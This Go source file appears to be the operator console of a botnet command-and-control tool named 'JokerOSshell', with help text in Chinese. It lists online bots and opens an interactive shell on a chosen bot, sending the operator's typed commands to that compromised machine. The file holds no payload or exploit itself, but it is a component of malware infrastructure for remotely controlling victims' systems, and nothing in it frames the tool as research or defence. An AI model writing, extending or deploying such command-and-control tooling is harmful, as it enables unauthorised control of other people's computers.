package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"time"
)

func handleHelp() {
	fmt.Println("\n####################################\n&& SessionList > 获取在线Bot\n&& Shell {BotName} > 进入某Bot的Shell\n####################################\n")
}

func handleSessionList() {
	mu.Lock()
	if ObtainingOnlineNumberOfPeople == nil {
		fmt.Print("空\n")
	}
	for _, i := range ObtainingOnlineNumberOfPeople {
		fmt.Println(i)
	}
	mu.Unlock()
}

func handleExit() {
	os.Exit(0)
}

func handleShell(input string) {
	FlagBool = false
	parts := strings.Fields(input)
	if len(parts) >= 2 {
		hostname := parts[1]
		if findSession(hostname) {
			go func() {
				FlagInTrue <- hostname
			}()
			go func() {
				FlagInFalse = hostname
			}()
			CommandShell(hostname)
		}
	} else {
		fmt.Println("请输入BotName")
	}
}

func handleDefault() {
	fmt.Println("找不到该命令")
}

func UserInputLoop() {
	scanner := bufio.NewScanner(os.Stdin)

	for {
		select {
		case commandeering := <-command:
			if commandeering == "exit" {
			}
		default:
		}
		fmt.Print("$ JokerOSshell?>> ")
		if scanner.Scan() {
			input := scanner.Text()
			switch {
			case strings.ToLower(input) == "help":

				handleHelp()
			case strings.ToLower(input) == "sessionlist":

				handleSessionList()
			case strings.ToLower(input) == "exit":
				handleExit()
			case strings.HasPrefix(input, "shell"):
				handleShell(input)
			default:
				handleDefault()
			}
		} else {
			break
		}
	}
	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading standard input:", err)
	}
}

func CommandShell(hostname string) {
	scanner := bufio.NewScanner(os.Stdin)
	for {
		time.Sleep(time.Second * 1)
		fmt.Printf("$ %s Shell?>> ", hostname)
		if scanner.Scan() {
			commandString := scanner.Text()

			if commandString == "exit" {
				return
			}
			select {
			case command <- commandString:
				FlagBool = true
			default:
				fmt.Println("Command channel is full, unable to send data")
			}
		} else {
			break
		}
	}
	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading standard input:", err)
	}
}

func InteractiveMain() {
	time.Sleep(time.Second * 2)
	banner()
	UserInputLoop()
}
